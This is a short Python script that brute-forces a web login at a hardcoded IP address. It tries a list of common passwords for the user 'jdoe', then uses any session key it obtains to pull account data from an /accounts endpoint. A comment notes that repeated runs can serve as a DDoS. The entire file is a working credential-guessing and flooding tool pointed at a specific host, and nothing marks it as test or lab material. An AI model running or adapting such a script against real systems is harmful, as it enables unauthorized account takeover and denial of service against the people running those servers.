import requests, sys, json
'''
python accounts.py 139.198.3.206:8050 10 can be DDOS
'''
passwords = ['123456', '123456789', 'qwerty', '12345678', '111111', '1234567890', '1234567', 'password',
'123123', '987654321', 'qwertyuiop', 'mynoob', '123321', '666666', '18atcskd2w', '7777777', '1q2w3e4r',
'654321', '555555', '3rjs1la7qe', 'google', '1q2w3e4r5t', '123qwe', 'Zxcvbnm', '1q2w3e']

def tryAccounts(host):
    if not host.startswith('http://'):
        host = 'http://' + host

    for psd in passwords:
        r = requests.post(host +'/login', data={'username': 'jdoe', 'password': psd})
        print(r.content)
        data = json.loads(r.content)
        if data.get('key'):
            r = requests.post(host +'/accounts', data={'session_key': data.get('key')})
            print(r.content)

if __name__ == '__main__':
    host = '139.198.3.206:8050'
    times = 1
    if len(sys.argv) > 1:
        host = sys.argv[1]
    if len(sys.argv) > 2:
        times = int(sys.argv[2])
    
    while times:
        tryAccounts(host)
        times = times - 1